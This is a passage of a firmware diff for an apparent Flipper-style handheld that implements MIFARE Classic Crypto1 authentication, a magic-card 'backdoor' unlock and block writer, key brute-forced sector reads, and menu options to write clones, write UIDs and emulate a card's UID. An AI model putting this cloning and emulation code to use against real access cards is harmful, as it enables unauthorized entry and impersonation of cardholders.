+    // WUPC: send 0x40 as 7-bit short frame WITHOUT CRC
+    nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    uint8_t wupc = 0x40;
+    nfc_fifo_w(&wupc, 1);
+    nfc_wr(NFC_TX_BYTES1, 0);
+    nfc_wr(NFC_TX_BYTES1 + 1, 7); // 7 bits
+    nfc_cmd(NFC_CMD_TX_NO_CRC);    // NO CRC for short frames
+    unsigned long dl = millis() + 20;
+    while (millis() < dl) {
+        uint8_t irq = nfc_rr(0x1A);
+        if (irq & 0x10) break; // RXE
+        delayMicroseconds(200);
+    }
+    int n = nfc_rr(NFC_FIFO_STA1);
+    Serial.printf("[MAGIC] WUPC: fifo=%d\n", n);
+    if (n < 1) return false;
+    uint8_t resp;
+    nfc_fifo_r(&resp, 1);
+    Serial.printf("[MAGIC] WUPC resp: 0x%02X\n", resp);
+    if (resp != 0x0A && resp != 0x04 && resp != 0x40 && resp != 0x44) return false;
+
+    // Send 0x43 to enter backdoor mode
+    uint8_t cmd43 = 0x43;
+    int rx_len;
+    uint8_t* r = nfc_transceive(&cmd43, 1, &rx_len, 50);
+    if (!r || rx_len < 1 || r[0] != 0x0A) {
+        Serial.printf("[MAGIC] 0x43 fail: rx=%d resp=%02X\n", rx_len, r ? r[0] : 0xFF);
+        return false;
+    }
+    Serial.println("[MAGIC] Backdoor active");
+    return true;
+}
+
+bool nfc_magic_write_block(uint8_t block, const uint8_t* data16) {
+    // Standard WRITE command (unencrypted, card is in backdoor mode)
+    uint8_t cmd[2] = {0xA0, block};
+    int rx_len;
+    uint8_t* resp = nfc_transceive(cmd, 2, &rx_len, 100);
+    if (!resp || rx_len < 1 || (resp[0] & 0x0F) != 0x0A) {
+        Serial.printf("[MAGIC] Write cmd fail blk %d\n", block);
+        return false;
+    }
+    resp = nfc_transceive(data16, 16, &rx_len, 100);
+    if (!resp || rx_len < 1 || (resp[0] & 0x0F) != 0x0A) {
+        Serial.printf("[MAGIC] Write data fail blk %d\n", block);
+        return false;
+    }
+    return true;
+}
+
+bool nfc_magic_halt() {
+    uint8_t halt[2] = {0x50, 0x00};
+    nfc_transceive(halt, 2, nullptr, 10);
+    return true;
+}
+
+void c1_init(Crypto1State& c, uint64_t key) {
+    c.odd = 0; c.even = 0;
+    for (int i = 47; i > 0; i -= 2) {
+        c.odd = ((c.odd << 1) | ((key >> ((i - 1) ^ 7)) & 1)) & 0xFFFFFF;
+        c.even = ((c.even << 1) | ((key >> (i ^ 7)) & 1)) & 0xFFFFFF;
+    }
+}
+
+uint8_t c1_bit(Crypto1State& c, uint8_t inp, bool is_enc) {
+    uint8_t out = c1_filter(c.odd);
+    uint32_t feed = (out & (is_enc ? 1 : 0));
+    feed ^= (inp & 1);
+    feed ^= C1_LF_POLY_ODD & c.odd;
+    feed ^= C1_LF_POLY_EVEN & c.even;
+    c.even = ((c.even << 1) | c1_even_parity32(feed)) & 0xFFFFFF;
+    uint32_t tmp = c.odd; c.odd = c.even; c.even = tmp;
+    return out;
+}
+
+uint8_t c1_byte(Crypto1State& c, uint8_t inp, bool is_enc) {
+    uint8_t out = 0;
+    for (int i = 0; i < 8; i++)
+        out |= c1_bit(c, (inp >> i) & 1, is_enc) << i;
+    return out;
+}
+
+uint32_t c1_word(Crypto1State& c, uint32_t inp, bool is_enc) {
+    uint32_t out = 0;
+    for (int i = 0; i < 32; i++)
+        out |= (uint32_t)c1_bit(c, (inp >> (i ^ 24)) & 1, is_enc) << (24 ^ i);
+    return out;
+}
+
+uint32_t c1_prng_successor(uint32_t x, int n) {
+    x = c1_swapendian32(x);
+    for (int i = 0; i < n; i++)
+        x = ((x >> 1) | ((((x >> 16) ^ (x >> 18) ^ (x >> 19) ^ (x >> 21)) & 1) << 31));
+    return c1_swapendian32(x);
+}
+
+uint16_t c1_iso14443a_crc(const uint8_t* data, int len) {
+    uint16_t crc = 0x6363;
+    for (int i = 0; i < len; i++) {
+        uint8_t bt = data[i] ^ (crc & 0xFF);
+        bt ^= (bt << 4) & 0xFF;
+        crc = (crc >> 8) ^ ((uint16_t)bt << 8) ^ ((uint16_t)bt << 3) ^ (bt >> 4);
+    }
+    return crc;
+}
+
+// Pack 8 data bytes + 8 parity bits into 9 bytes (72 bits) for no_tx_par mode
+int c1_pack_with_parity(const uint8_t* data, const uint8_t* parity, int count, uint8_t* out) {
+    int total = 0;
+    int max_bytes = (count * 9 + 7) / 8;
+    memset(out, 0, max_bytes);
+    for (int i = 0; i < count; i++) {
+        for (int b = 0; b < 8; b++) {
+            if ((data[i] >> b) & 1)
+                out[total / 8] |= (1 << (total % 8));
+            total++;
+        }
+        if (parity[i] & 1)
+            out[total / 8] |= (1 << (total % 8));
+        total++;
+    }
+    return total;
+}
+
+// ── MIFARE Classic Crypto1 Authentication ──
+
+bool nfc_mifare_auth_crypto1_cmd(const NfcCardInfo& card, uint8_t block, const uint8_t* key6, uint8_t auth_byte) {
+    Serial.printf("[C1] Auth blk=%d cmd=%02X key=%02X%02X%02X%02X%02X%02X uid=%02X%02X%02X%02X\n",
+        block, auth_byte, key6[0],key6[1],key6[2],key6[3],key6[4],key6[5],
+        card.uid[0],card.uid[1],card.uid[2],card.uid[3]);
+    // Step 1: Send AUTH_A + block → get 4-byte Nt
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    nfc_cmd(NFC_CMD_RESET_GAIN);
+    nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    nfc_wr(NFC_ISO14443A, 0x00);
+    uint8_t aux = nfc_rr(NFC_AUX_DEF);
+    nfc_wr(NFC_AUX_DEF, aux | 0x80);
+    uint8_t auth_cmd[2] = {auth_byte, block};
+    nfc_fifo_w(auth_cmd, 2);
+    nfc_set_tx_len(2);
+    nfc_cmd(NFC_CMD_TX_CRC);
+
+    // Wait for Nt
+    unsigned long dl = millis() + 50;
+    while (millis() < dl) {
+        uint8_t irq = nfc_rr(0x1A);
+        if (irq & 0x10) break; // RXE
+        if (irq & 0x04) break; // COL
+        delayMicroseconds(200);
+    }
+    int n = nfc_rr(NFC_FIFO_STA1);
+    Serial.printf("[C1] Step1: FIFO=%d IRQ_MAIN=%02X\n", n, nfc_rr(0x1A));
+    if (n < 4) {
+        Serial.printf("[C1] FAIL: no Nt (n=%d)\n", n);
+        return false;
+    }
+    uint8_t nt_bytes[4];
+    nfc_fifo_r(nt_bytes, 4);
+    Serial.printf("[C1] Nt=%02X%02X%02X%02X\n", nt_bytes[0],nt_bytes[1],nt_bytes[2],nt_bytes[3]);
+
+    uint32_t nt = ((uint32_t)nt_bytes[0] << 24) | ((uint32_t)nt_bytes[1] << 16) |
+                  ((uint32_t)nt_bytes[2] << 8) | nt_bytes[3];
+    uint32_t cuid = ((uint32_t)card.uid[0] << 24) | ((uint32_t)card.uid[1] << 16) |
+                    ((uint32_t)card.uid[2] << 8) | card.uid[3];
+
+    // Step 2: Init Crypto1, encrypt NR+AR
+    uint64_t key64 = 0;
+    for (int i = 0; i < 6; i++) key64 = (key64 << 8) | key6[i];
+
+    Crypto1State crypto;
+    c1_init(crypto, key64);
+    c1_word(crypto, nt ^ cuid, false);
+
+    // Random NR
+    uint8_t nr[4];
+    for (int i = 0; i < 4; i++) nr[i] = (uint8_t)(esp_random() >> (i * 8));
+
+    uint8_t enc_nr[4], par_nr[4];
+    for (int i = 0; i < 4; i++) {
+        enc_nr[i] = c1_byte(crypto, nr[i], false) ^ nr[i];
+        par_nr[i] = (c1_filter(crypto.odd) ^ C1_ODD_PARITY[nr[i]]) & 1;
+    }
+
+    // AR = suc²(Nt) byte by byte, each successor advances 8 steps
+    uint32_t ar_nt = c1_prng_successor(nt, 32);
+    uint8_t enc_ar[4], par_ar[4];
+    for (int i = 0; i < 4; i++) {
+        ar_nt = c1_prng_successor(ar_nt, 8);
+        uint8_t ar_byte = ar_nt & 0xFF;
+        enc_ar[i] = c1_byte(crypto, 0, false) ^ ar_byte;
+        par_ar[i] = (c1_filter(crypto.odd) ^ C1_ODD_PARITY[ar_byte]) & 1;
+    }
+
+    // Pack {NR}{AR} with parity into 9 bytes (72 bits)
+    uint8_t data8[8], parity8[8];
+    memcpy(data8, enc_nr, 4);
+    memcpy(data8 + 4, enc_ar, 4);
+    memcpy(parity8, par_nr, 4);
+    memcpy(parity8 + 4, par_ar, 4);
+    uint8_t packed[12];
+    int total_bits = c1_pack_with_parity(data8, parity8, 8, packed);
+    int packed_bytes = (total_bits + 7) / 8;
+
+    // Step 3: Send {NR}{AR} with no_tx_par + no_rx_par
+    nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    // Set no_tx_par (bit7) + no_rx_par (bit6) in ISO14443A register
+    uint8_t iso_reg = nfc_rr(NFC_ISO14443A);
+    nfc_wr(NFC_ISO14443A, iso_reg | 0xC0);
+    nfc_fifo_w(packed, packed_bytes);
+    // TX length in bits
+    nfc_wr(NFC_TX_BYTES1, (total_bits >> 8) & 0xFF);
+    nfc_wr(NFC_TX_BYTES1 + 1, total_bits & 0xFF);
+    nfc_cmd(NFC_CMD_TX_NO_CRC);
+
+    // Wait for AT response
+    dl = millis() + 50;
+    bool got_txe = false, got_rxe = false;
+    while (millis() < dl) {
+        uint8_t irq = nfc_rr(0x1A);
+        if (irq & 0x08) got_txe = true;
+        if (irq & 0x10) { got_rxe = true; break; }
+        if (got_txe && !got_rxe) {
+            uint8_t t = nfc_rr(0x1B);
+            if (t & 0x40) break; // NRE
+        }
+        delayMicroseconds(200);
+    }
+    n = nfc_rr(NFC_FIFO_STA1);
+    Serial.printf("[C1] Step3: AT FIFO=%d txe=%d rxe=%d\n", n, got_txe, got_rxe);
+    if (n >= 4) {
+        uint8_t at_buf[8];
+        int at_read = min(n, 8);
+        nfc_fifo_r(at_buf, at_read);
+        Serial.printf("[C1] AT=%02X%02X%02X%02X (%d bytes consumed) AUTH OK\n",
+                      at_buf[0],at_buf[1],at_buf[2],at_buf[3], at_read);
+        c1_word(crypto, 0, false);
+        // Store crypto state globally for encrypted read/write
+        mf_crypto = crypto;
+        mf_auth_active = true;
+    } else {
+        Serial.printf("[C1] FAIL: no AT response\n");
+        mf_auth_active = false;
+    }
+
+    // Keep ISO14443A with no_tx_par/no_rx_par set — encrypted comms need it
+    // nfc_wr(NFC_ISO14443A, iso_reg & ~0xC0); // DON'T restore — encrypted mode
+
+    bool ok = (n >= 4);
+    Serial.printf("[MF] Auth block %d: Nt=%08X %s\n", block, nt, ok ? "OK" : "FAIL");
+    return ok;
+}
+
+bool nfc_mifare_auth_crypto1(const NfcCardInfo& card, uint8_t block, const uint8_t* key6) {
+    return nfc_mifare_auth_crypto1_cmd(card, block, key6, 0x60);
+}
+
+// Parse saved .nfc dump file into block array
+int nfc_parse_dump(const char* path, uint8_t blocks[][16], int max_blocks, uint8_t* uid_out, int* uid_len_out) {
+    File f = SD.open(path, FILE_READ);
+    if (!f) return 0;
+    int count = 0;
+    memset(blocks, 0, max_blocks * 16);
+    while (f.available() && count < max_blocks) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.startsWith("UID:") && uid_out) {
+            // Parse UID: XX XX XX XX
+            String uid_str = line.substring(4);
+            uid_str.trim();
+            int ulen = 0;
+            int pos = 0;
+            while (pos < (int)uid_str.length() && ulen < 10) {
+                while (pos < (int)uid_str.length() && uid_str[pos] == ' ') pos++;
+                if (pos + 1 < (int)uid_str.length()) {
+                    uid_out[ulen++] = (uint8_t)strtol(uid_str.substring(pos, pos + 2).c_str(), NULL, 16);
+                    pos += 2;
+                } else break;
+            }
+            if (uid_len_out) *uid_len_out = ulen;
+        }
+        if (line.startsWith("Block ")) {
+            int colon = line.indexOf(':');
+            if (colon < 0) continue;
+            int blk_num = line.substring(6, colon).toInt();
+            if (blk_num < 0 || blk_num >= max_blocks) continue;
+            String hex_data = line.substring(colon + 1);
+            hex_data.trim();
+            int bpos = 0, bidx = 0;
+            while (bpos < (int)hex_data.length() && bidx < 16) {
+                while (bpos < (int)hex_data.length() && hex_data[bpos] == ' ') bpos++;
+                if (bpos + 1 < (int)hex_data.length()) {
+                    blocks[blk_num][bidx++] = (uint8_t)strtol(hex_data.substring(bpos, bpos + 2).c_str(), NULL, 16);
+                    bpos += 2;
+                } else break;
+            }
+            if (blk_num >= count) count = blk_num + 1;
+        }
+    }
+    f.close();
+    Serial.printf("[MF] Parsed dump: %d blocks from %s\n", count, path);
+    return count;
+}
+
+// ── NFC Ultralight/NTAG Read + NDEF Parse ──
+
+int nfc_ul_read_pages(uint8_t* buf, int max_pages) {
+    int total = 0;
+    for (int pg = 0; pg < max_pages; pg += 4) {
+        uint8_t cmd[2] = {0x30, (uint8_t)pg};
+        int rx_len;
+        uint8_t* resp = nfc_transceive(cmd, 2, &rx_len, 100);
+        if (!resp || rx_len < 16) break;
+        int pages_to_copy = min(4, max_pages - pg);
+        memcpy(buf + pg * 4, resp, pages_to_copy * 4);
+        total += pages_to_copy;
+    }
+    return total;
+}
+
+// Parse NDEF from Ultralight/NTAG pages (starting at page 4)
+// Returns decoded text/URL in out_str, max out_len chars
+int nfc_parse_ndef(const uint8_t* pages, int num_pages, char* out_str, int out_len) {
+    if (num_pages < 5) return 0;
+    const uint8_t* data = pages + 4 * 4; // NDEF starts at page 4
+    int data_len = (num_pages - 4) * 4;
+
+    // Find NDEF TLV: type 0x03
+    int pos = 0;
+    while (pos < data_len - 2) {
+        if (data[pos] == 0x03) { pos++; break; }
+        if (data[pos] == 0x00) { pos++; continue; }
+        if (data[pos] == 0xFE) return 0; // terminator
+        pos += 2 + data[pos + 1]; // skip other TLV
+    }
+    if (pos >= data_len - 2) return 0;
+    int ndef_len = data[pos++];
+    if (ndef_len == 0 || pos + ndef_len > data_len) return 0;
+
+    // Parse NDEF record header
+    const uint8_t* rec = data + pos;
+    if (ndef_len < 4) return 0;
+    uint8_t tnf = rec[0] & 0x07;
+    int type_len = rec[1];
+    int payload_len = rec[2];
+    int type_offset = 3;
+    int payload_offset = type_offset + type_len;
+    if (payload_offset + payload_len > ndef_len) return 0;
+
+    const uint8_t* payload = rec + payload_offset;
+
+    if (tnf == 0x01 && type_len == 1 && rec[type_offset] == 'U') {
+        // URI record
+        const char* prefixes[] = {"", "http://www.", "https://www.", "http://", "https://",
+                                   "tel:", "mailto:", "ftp://anonymous:anonymous@ftp.",
+                                   "ftp://ftp.", "ftps://", "sftp://"};
+        int pfx = (payload_len > 0 && payload[0] < 11) ? payload[0] : 0;
+        int written = snprintf(out_str, out_len, "%s", prefixes[pfx]);
+        int remaining = min(payload_len - 1, out_len - written - 1);
+        if (remaining > 0) { memcpy(out_str + written, payload + 1, remaining); out_str[written + remaining] = 0; }
+        return 1; // URL
+    }
+    if (tnf == 0x01 && type_len == 1 && rec[type_offset] == 'T') {
+        // Text record
+        uint8_t lang_len = payload[0] & 0x3F;
+        int text_start = 1 + lang_len;
+        int text_len = min(payload_len - text_start, out_len - 1);
+        if (text_len > 0) { memcpy(out_str, payload + text_start, text_len); out_str[text_len] = 0; }
+        return 2; // Text
+    }
+    return 0;
+}
+
+// ── NFC Write functions (NTAG/Ultralight + NDEF) ──
+
+bool nfc_ul_write_page(uint8_t page, const uint8_t* data4) {
+    uint8_t cmd[6] = {0xA2, page, data4[0], data4[1], data4[2], data4[3]};
+    int rx_len;
+    uint8_t* resp = nfc_transceive(cmd, 6, &rx_len, 100);
+    return (resp != NULL && rx_len >= 1);
+}
+
+int nfc_ndef_encode_url(const char* url, uint8_t* out, int max_len) {
+    uint8_t prefix = 0x00;
+    int skip = 0;
+    if (strncmp(url, "https://www.", 12) == 0) { prefix = 0x02; skip = 12; }
+    else if (strncmp(url, "http://www.", 11) == 0) { prefix = 0x01; skip = 11; }
+    else if (strncmp(url, "https://", 8) == 0) { prefix = 0x04; skip = 8; }
+    else if (strncmp(url, "http://", 7) == 0) { prefix = 0x03; skip = 7; }
+    int text_len = strlen(url + skip);
+    int payload_len = 1 + text_len;
+    if (4 + payload_len > max_len) return 0;
+    out[0] = 0xD1; out[1] = 0x01; out[2] = (uint8_t)payload_len; out[3] = 0x55;
+    out[4] = prefix;
+    memcpy(out + 5, url + skip, text_len);
+    return 4 + payload_len;
+}
+
+int nfc_ndef_encode_text(const char* text, uint8_t* out, int max_len) {
+    int text_len = strlen(text);
+    int payload_len = 3 + text_len;
+    if (4 + payload_len > max_len) return 0;
+    out[0] = 0xD1; out[1] = 0x01; out[2] = (uint8_t)payload_len; out[3] = 0x54;
+    out[4] = 0x02; out[5] = 'e'; out[6] = 'n';
+    memcpy(out + 7, text, text_len);
+    return 4 + payload_len;
+}
+
+int nfc_ndef_wrap_tlv(const uint8_t* record, int rec_len, uint8_t* out, int max_len) {
+    int pos = 0;
+    out[pos++] = 0x03;
+    if (rec_len < 0xFF) {
+        out[pos++] = (uint8_t)rec_len;
+    } else {
+        out[pos++] = 0xFF;
+        out[pos++] = (rec_len >> 8) & 0xFF;
+        out[pos++] = rec_len & 0xFF;
+    }
+    memcpy(out + pos, record, rec_len);
+    pos += rec_len;
+    out[pos++] = 0xFE;
+    while (pos % 4 != 0) out[pos++] = 0x00;
+    return pos;
+}
+
+bool nfc_write_ndef(const uint8_t* ndef_tlv, int tlv_len) {
+    uint8_t cc[4] = {0xE1, 0x10, 0x06, 0x00};
+    if (tlv_len > 137 * 4) cc[2] = 0x3F;
+    else if (tlv_len > 48 * 4) cc[2] = 0x12;
+    if (!nfc_ul_write_page(3, cc)) {
+        Serial.println("[NFC] CC write failed");
+        return false;
+    }
+    int pages = (tlv_len + 3) / 4;
+    for (int i = 0; i < pages; i++) {
+        uint8_t page_data[4] = {0, 0, 0, 0};
+        int remaining = tlv_len - i * 4;
+        memcpy(page_data, ndef_tlv + i * 4, min(4, remaining));
+        if (!nfc_ul_write_page(4 + i, page_data)) {
+            Serial.printf("[NFC] Write page %d failed\n", 4 + i);
+            return false;
+        }
+    }
+    Serial.printf("[NFC] NDEF written: %d pages\n", pages);
+    return true;
+}
+
+bool nfc_emulate_uid(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak, int timeout_s) {
+    if (!nfc_opened) return false;
+    nfc_setup_target_mode(uid, uid_len, atqa, sak);
+
+    unsigned long deadline = millis() + (unsigned long)timeout_s * 1000;
+    unsigned long detect_count = 0;
+    while (millis() < deadline) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+        uint8_t tgt_irq = nfc_rr(NFC_IRQ_TGT);
+        uint8_t main_irq = nfc_rr(NFC_IRQ_MAIN);
+
+        if (tgt_irq & 0x08) detect_count++;
+        if (main_irq & 0x01) {
+            nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+            uint8_t pt2 = nfc_rr(NFC_PASS_TGT);
+            nfc_wr(NFC_PASS_TGT, pt2 & ~0x01);
+            nfc_cmd(NFC_CMD_GOTO_SENSE);
+        }
+        delay(5);
+    }
+
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    return detect_count > 0;
+}
+
+// ── NFC Menu (Flipper-style UI with sprite rendering) ──
+
+void nfcMenu() {
+    keyRelease();
+    const int W = 240, H = 135;
+
+    // Open NFC
+    M5.Display.clear(TFT_BLACK);
+    M5.Display.setTextSize(1); M5.Display.setTextFont(1);
+    M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK);
+    M5.Display.setCursor(10, 50); M5.Display.print("Opening Cap NFC...");
+    M5.Display.display();
+    if (!nfc_open()) {
+        M5.Display.setCursor(10, 70); M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+        M5.Display.print("Cap NFC not found! Check Cap HAT");
+        M5.Display.display(); delay(2000); inMenu = true; return;
+    }
+
+    M5Canvas* sprite = new(std::nothrow) M5Canvas(&M5.Display);
+    bool use_sprite = false;
+    if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
+    auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+
+    const char* items[] = {"Read Tag", "Saved Tags", "EMV Reader", "Write NDEF", "Write Clone", "Write UID"};
+    const int nfc_item_count = 6;
+    const int nfc_lineH = 16;
+    const int nfc_listY = 18;
+    const int nfc_maxVis = (H - nfc_listY - 14) / nfc_lineH;
+    int nfc_sel = 0, nfc_start = 0;
+
+    while (true) {
+        bool nfc_need_draw = true;
+        int mode = 0;
+        while (!mode) {
+            if (nfc_need_draw) {
+                if (nfc_sel < nfc_start) nfc_start = nfc_sel;
+                if (nfc_sel >= nfc_start + nfc_maxVis) nfc_start = nfc_sel - nfc_maxVis + 1;
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 16, 0x0841);
+                sp.drawFastHLine(0, 16, W, 0xFC00);
+                sp.setTextFont(1);
+                sp.setTextSize(1.5);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(80, 2); sp.print("Cap NFC");
+                sp.setTextSize(1.5);
+                for (int i = 0; i < nfc_maxVis && (nfc_start + i) < nfc_item_count; i++) {
+                    int idx = nfc_start + i;
+                    int y = nfc_listY + i * nfc_lineH;
+                    if (idx == nfc_sel) {
+                        sp.fillRect(0, y, W, nfc_lineH, TFT_NAVY);
+                        sp.setTextColor(TFT_GREEN, TFT_NAVY);
+                    } else {
+                        sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                    }
+                    sp.setCursor(10, y + 2); sp.print(items[idx]);
+                }
+                sp.fillRect(0, H - 14, W, 14, 0x0841);
+                sp.setTextSize(1);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                sp.print(";/. ENT BACK");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                nfc_need_draw = false;
+            }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); mode = -1; break; }
+            if (kp(';')) { nfc_sel = (nfc_sel - 1 + nfc_item_count) % nfc_item_count; nfc_need_draw = true; delay(150); }
+            if (kp('.')) { nfc_sel = (nfc_sel + 1) % nfc_item_count; nfc_need_draw = true; delay(150); }
+            if (kp(KEY_ENTER)) { mode = nfc_sel + 1; keyRelease(); }
+            delay(10);
+        }
+        keyRelease();
+        if (mode == -1) break;
+
+        // ── Mode 1: Read Tag (with analysis screen) ──
+        if (mode == 1) {
+            while (true) {
+                // Scanning screen
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Cap NFC Read");
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                sp.setCursor(30, 55); sp.print("Place tag on reader...");
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                if (use_sprite) sprite->pushSprite(0, 0);
+
+                // Poll for card with key check
+                NfcCardInfo card = {};
+                while (!card.valid) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); goto read_done; }
+                    card = nfc_activate();
+                    if (!card.valid) delay(200);
+                }
+
+                // Card found — determine type
+                const char* card_type = "Unknown";
+                bool is_classic = false;
+                if (card.sak == 0x08) { card_type = "MIFARE Classic 1K"; is_classic = true; }
+                else if (card.sak == 0x18) { card_type = "MIFARE Classic 4K"; is_classic = true; }
+                else if (card.sak == 0x09) { card_type = "MIFARE Mini"; is_classic = true; }
+                else if (card.sak == 0x00) card_type = "Ultralight/NTAG";
+                else if (card.sak == 0x20) card_type = "ISO14443-4";
+                else if (card.sak == 0x28) card_type = "JCOP/SmartMX";
+
+                // For Ultralight/NTAG: read pages and parse NDEF
+                char ndef_content[128] = {};
+                int ndef_type = 0; // 0=none, 1=URL, 2=Text
+                if (card.sak == 0x00) {
+                    uint8_t ul_pages[64 * 4] = {};
+                    int pages_read = nfc_ul_read_pages(ul_pages, 64);
+                    if (pages_read >= 5) {
+                        ndef_type = nfc_parse_ndef(ul_pages, pages_read, ndef_content, sizeof(ndef_content) - 1);
+                        Serial.printf("[NFC] NDEF: type=%d content='%s' pages=%d\n", ndef_type, ndef_content, pages_read);
+                    }
+                }
+
+                // For MIFARE Classic: read sectors with key brute-force
+                uint8_t (*mf_blocks)[16] = nullptr;
+                int mf_sectors_read = 0;
+                int mf_total_blocks = 0;
+                if (is_classic) {
+                    int num_sectors = (card.sak == 0x18) ? 40 : ((card.sak == 0x09) ? 5 : 16);
+                    mf_total_blocks = num_sectors * 4;
+                    mf_blocks = (uint8_t (*)[16])malloc(mf_total_blocks * 16);
+                    if (mf_blocks) {
+                        memset(mf_blocks, 0, mf_total_blocks * 16);
+                        mf_sectors_read = nfc_mifare_read_all(card, mf_blocks, mf_total_blocks,
+                                                              sp, use_sprite, sprite);
+                    }
+                }
+
+                // Analysis screen
+                while (true) {
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Tag Found!");
+
+                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                    sp.setCursor(10, 20); sp.print("UID: ");
+                    for (int i = 0; i < card.uid_len; i++) sp.printf("%02X ", card.uid[i]);
+
+                    sp.setCursor(10, 34); sp.printf("ATQA: %04X  SAK: %02X", card.atqa, card.sak);
+                    sp.setCursor(10, 48); sp.printf("Type: %s", card_type);
+
+                    if (is_classic && mf_blocks) {
+                        int num_sectors = mf_total_blocks / 4;
+                        sp.setTextColor(mf_sectors_read > 0 ? TFT_GREEN : TFT_RED, TFT_BLACK);
+                        sp.setCursor(10, 62); sp.printf("Sectors: %d/%d read", mf_sectors_read, num_sectors);
+                    }
+
+                    // Show NDEF content for Ultralight/NTAG
+                    if (ndef_type > 0) {
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(10, 62); sp.print(ndef_type == 1 ? "URL:" : "Text:");
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        // Word-wrap NDEF content on 2 lines
+                        String nc(ndef_content);
+                        if (nc.length() <= 36) {
+                            sp.setCursor(10, 74); sp.print(nc.substring(0, 36));
+                        } else {
+                            sp.setCursor(10, 74); sp.print(nc.substring(0, 36));
+                            sp.setCursor(10, 86); sp.print(nc.substring(36, 72));
+                        }
+                    }
+
+                    sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                    int y_opt = (is_classic || ndef_type > 0) ? 98 : 70;
+                    sp.setCursor(10, y_opt); sp.print("ENTER = Save");
+                    sp.setCursor(10, y_opt + 12); sp.print("E = Emulate  BACK = Rescan");
+
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.printf("UID len: %d bytes", card.uid_len);
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); if (mf_blocks) free(mf_blocks); goto read_scan_again; }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            // Release NFC before any SD access (shared SPI bus)
+                            nfc_cmd(NFC_CMD_STOP_ALL);
+                            digitalWrite(NFC_CS, HIGH);
+                            delay(2);
+                            // Save to SD (with block data if Classic)
+                            SD.mkdir("/evil/nfc");
+                            char fname[64];
+                            snprintf(fname, sizeof(fname), "/evil/nfc/tag_%02X%02X%02X%02X.txt",
+                                card.uid[0], card.uid[1], card.uid[2], card.uid[3]);
+                            File f = SD.open(fname, FILE_WRITE);
+                            bool ok = false;
+                            if (f) {
+                                f.print("UID:");
+                                for (int i = 0; i < card.uid_len; i++) f.printf(" %02X", card.uid[i]);
+                                f.println();
+                                f.printf("ATQA: %04X\n", card.atqa);
+                                f.printf("SAK: %02X\n", card.sak);
+                                f.printf("Type: %s\n", card_type);
+                                // Write block data — build each line in buffer to reduce SPI ops
+                                if (mf_blocks && mf_total_blocks > 0) {
+                                    char hex_line[80];
+                                    for (int b = 0; b < mf_total_blocks; b++) {
+                                        bool has_data = false;
+                                        for (int j = 0; j < 16; j++) if (mf_blocks[b][j]) { has_data = true; break; }
+                                        if (has_data || b == 0) {
+                                            int pos = snprintf(hex_line, sizeof(hex_line), "Block %d:", b);
+                                            for (int j = 0; j < 16; j++) pos += snprintf(hex_line + pos, sizeof(hex_line) - pos, " %02X", mf_blocks[b][j]);
+                                            f.println(hex_line);
+                                        }
+                                    }
+                                }
+                                f.close();
+                                ok = true;
+                            }
+                            sp.fillScreen(TFT_BLACK);
+                            sp.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
+                            sp.setCursor(10, 50);
+                            sp.print(ok ? "Saved!" : "SD save failed");
+                            if (ok) {
+                                sp.setCursor(10, 65); sp.print(fname);
+                                if (mf_blocks) {
+                                    sp.setCursor(10, 80); sp.printf("%d sectors, %d blocks", mf_sectors_read, mf_total_blocks);
+                                }
+                            }
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            delay(1500);
+                            if (mf_blocks) free(mf_blocks);
+                            goto read_scan_again;
+                        }
+                        if (kp('e') || kp('E')) {
+                            keyRelease();
+                            if (mf_blocks) free(mf_blocks);
+                            // Emulate this card's UID via ST25R3916 target mode
+                            sp.fillScreen(TFT_BLACK);
+                            sp.fillRect(0, 0, W, 14, 0x0841);
